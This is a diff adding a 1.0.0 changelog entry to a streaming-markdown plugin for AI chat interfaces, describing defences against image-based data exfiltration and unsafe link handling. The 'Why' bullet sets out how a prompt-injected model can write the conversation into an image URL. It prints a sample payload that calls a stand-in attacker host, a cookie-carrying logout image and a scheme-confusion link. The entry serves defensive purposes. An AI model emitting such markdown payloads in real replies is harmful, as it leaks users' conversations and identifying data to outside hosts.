@@ -1,5 +1,40 @@
 # @aparte/plugin-streaming-markdown
 
+## 1.0.0
+
+### Major Changes
+
+- 67efebe: A picture a model or a tool chose no longer loads by itself: `data:` and `blob:` pictures do, and any other shows as a link naming its host until the reader clicks it. To load your own, call `aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com'])`; `['*']` loads every picture, as before.
+
+  - **Why.** A picture fetches its address the moment it is shown, before anyone reads the reply, and a prompt-injected model can write the conversation into that address: `![](https://attacker.example/c.png?d=…)` sent it, the reader's IP and their browser to that host with no click — while the reply streamed, and again each time the conversation was shown. The page's own site is not trusted by default either: its pictures carry the reader's cookies (`![](/api/logout)`), and an open redirect on it turns a picture from the site into a picture from anywhere.
+  - **In a reply.** A held picture is a small link that says where it would load from (inside a link of the reply's own, a button, so that link stays whole). A click loads it in place, and the chat remembers the choice; a click with a modifier key is left to the browser, as for any link. `config.sanitizeHtml` applies the policy after whichever sanitizer is set, so DOMPurify or your own keeps it, and `@aparte/plugin-streaming-markdown` applies it before any `src` is set, so nothing is fetched while a reply streams. A picture's own address decides; of its `srcset`, only the candidates that load are kept, written again so a browser can only pick an address that was judged.
+  - **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
+  - **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
+  - Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
+
+### Patch Changes
+
+- e97d464: A link a model writes with an explicit scheme and no slash, `[docs](http:evil.example/x)`, now opens in a new tab like any other external link, and a `target="_self"` on it is ignored.
+
+  On an `https` page that URL resolves to `http://evil.example/x`, but it was treated as same-site and navigated the frame the chat lives in (in Electron, the whole app). Any link starting with `http:` or `https:` is now external, in the built-in sanitizer and in the live streamed link of `@aparte/plugin-streaming-markdown`. A same-site link spelled `https:/path` goes to a new tab too, which is harmless.
+
+- 2e5c5ab: The READMEs of the plugins and the framework packages now show a picture of what they draw. No code changes: nothing to do on your side.
+
+  Each plugin README that draws something (Markdown, maths, diagrams, both chart libraries, the approval modes, the question panel, artifacts, the model selector, code highlighting, compaction) shows its own demo, taken from the live docs (`https://apartejs.dev/shots/<name>.png`). The four framework packages show an assistant reply with a card, a formula and a chart.
+
+- Updated dependencies [26ddd6c]
+- Updated dependencies [e97d464]
+- Updated dependencies [0a6dd91]
+- Updated dependencies [635f69b]
+- Updated dependencies [224afde]
+- Updated dependencies [2e5c5ab]
+- Updated dependencies [67efebe]
+- Updated dependencies [99fcc42]
+- Updated dependencies [e97d464]
+- Updated dependencies [048864d]
+- Updated dependencies [99784ad]
+  - @aparte/core@1.0.0
+
 ## 0.32.1
 
 ## 0.32.0
